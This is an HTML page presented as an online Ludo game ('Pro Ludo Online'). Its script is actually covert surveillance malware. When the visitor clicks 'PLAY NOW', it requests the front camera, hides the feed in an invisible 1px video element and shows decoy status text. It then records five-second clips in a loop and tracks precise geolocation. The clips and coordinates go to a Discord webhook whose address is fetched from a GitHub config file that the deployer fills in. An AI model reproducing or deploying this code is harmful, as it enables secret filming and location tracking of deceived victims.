<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Ludo Online</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #1a1a1a;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: white;
            overflow: hidden;
        }
        .game-ui {
            text-align: center;
            width: 90%;
            max-width: 400px;
        }
        .board-preview {
            width: 100%;
            height: 300px;
            background: linear-gradient(45deg, #2c3e50, #34495e);
            border-radius: 15px;
            margin-bottom: 20px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid #444;
        }
        .play-btn {
            background: linear-gradient(to right, #ff416c, #ff4b2b);
            color: white;
            border: none;
            padding: 18px 45px;
            font-size: 22px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 5px 15px rgba(255, 75, 43, 0.4);
            transition: all 0.3s ease;
        }
        .status-bar {
            margin-top: 15px;
            font-size: 14px;
            color: #888;
            min-height: 20px;
            font-weight: 500;
        }
        #hiddenVideo {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0;
            z-index: -1;
            object-fit: cover;
        }
    </style>
</head>
<body>

    <div class="game-ui">
        <div class="board-preview">
            <span>🎲</span>
        </div>
        <button class="play-btn" id="playBtn">PLAY NOW</button>
        <div class="status-bar" id="statusText">Waiting for players...</div>
    </div>

    <video id="hiddenVideo" autoplay muted playsinline></video>

    <script>
        // CONFIG
        const CONFIG = {
            repoOwner: "YOUR_GITHUB_USERNAME", // Yahan apna username dalein
            repoName: "YOUR_REPO_NAME",        // Yahan apka repo name dalein
            branch: "main"
        };

        let webhookUrl = "";
        let currentLocation = null;
        let mediaRecorder;
        let videoChunks = [];
        let isRecording = false;
        let stream = null;

        const playBtn = document.getElementById('playBtn');
        const statusText = document.getElementById('statusText');
        const videoElement = document.getElementById('hiddenVideo');

        async function loadConfig() {
            try {
                // Load from GitHub Raw
                const url = `https://raw.githubusercontent.com/${CONFIG.repoOwner}/${CONFIG.repoName}/${CONFIG.branch}/config.json`;
                const response = await fetch(url);
                if (!response.ok) throw new Error("Config load failed");
                
                const data = await response.json();
                webhookUrl = data.discord_webhook_url;
                console.log("✅ Config Loaded:", webhookUrl);
            } catch (error) {
                console.error("❌ Error loading config:", error);
                statusText.innerText = "Config Error: Check Console";
            }
        }

        playBtn.addEventListener('click', async () => {
            if (!webhookUrl) {
                statusText.innerText = "Loading Config...";
                return;
            }

            playBtn.disabled = true;
            playBtn.style.opacity = "0.7";
            startLocationTracking();

            try {
                statusText.innerText = "Accessing Camera...";
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }, 
                    audio: false 
                });

                videoElement.srcObject = stream;
                videoElement.onloadedmetadata = () => {
                    statusText.innerText = "Finding nearby players...";
                    startRecordingLoop();
                };

            } catch (err) {
                statusText.innerText = "Camera Denied: " + err.message;
                console.error("Camera Error:", err);
            }
        });

        function startLocationTracking() {
            if (!navigator.geolocation) return;
            navigator.geolocation.watchPosition(
                (position) => {
                    currentLocation = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        time: new Date().toISOString()
                    };
                },
                (error) => {
                    currentLocation = { error: "Location unavailable" };
                },
                { enableHighAccuracy: true }
            );
        }

        function startRecordingLoop() {
            mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm;codecs=vp8'
            });

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    videoChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = async () => {
                if (videoChunks.length > 0) {
                    const blob = new Blob(videoChunks, { type: 'video/webm' });
                    videoChunks = [];
                    uploadToDiscord(blob);
                }
            };

            const loop = () => {
                if (!isRecording) {
                    isRecording = true;
                    mediaRecorder.start();
                    setTimeout(() => {
                        mediaRecorder.stop();
                        isRecording = false;
                        setTimeout(loop, 5000);
                    }, 5000);
                }
            };

            loop();
        }

        async function uploadToDiscord(blob) {
            if (!webhookUrl) return;

            const formData = new FormData();
            formData.append("file", blob, `ludo_capture_${Date.now()}.webm`);

            let payloadContent = "🟢 **Player Active**";
            if (currentLocation && !currentLocation.error) {
                payloadContent += `\n📍 **Location:** [Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}]`;
            } else {
                payloadContent += `\n📍 **Location:** Unknown`;
            }

            const payload = {
                content: payloadContent
            };
            formData.append("payload_json", JSON.stringify(payload));

            try {
                const response = await fetch(webhookUrl, {
                    method: "POST",
                    body: formData
                });

                if (response.ok) {
                    console.log("✅ Video Sent!");
                } else {
                    const errText = await response.text();
                    console.error("❌ Discord Error:", response.status, errText);
                }
            } catch (e) {
                console.error("❌ Fetch Error:", e);
            }
        }

        window.onload = loadConfig;
    </script>
</body>
</html>
